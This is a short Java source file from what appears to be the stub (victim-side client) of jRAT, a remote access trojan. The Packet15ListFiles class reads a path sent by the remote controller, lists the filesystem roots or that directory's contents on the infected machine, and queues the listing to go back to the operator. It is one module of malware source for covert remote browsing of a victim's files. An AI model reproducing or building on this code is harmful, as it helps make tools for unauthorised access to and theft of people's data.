package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet22ListFiles;


public class Packet15ListFiles extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String current = Connection.readLine();

		File[] files;

		if (current.length() == 0) {
			files = File.listRoots();
		} else {
			files = new File(current).listFiles();
		}

		Connection.addToSendQueue(new Packet22ListFiles(files));
	}

}
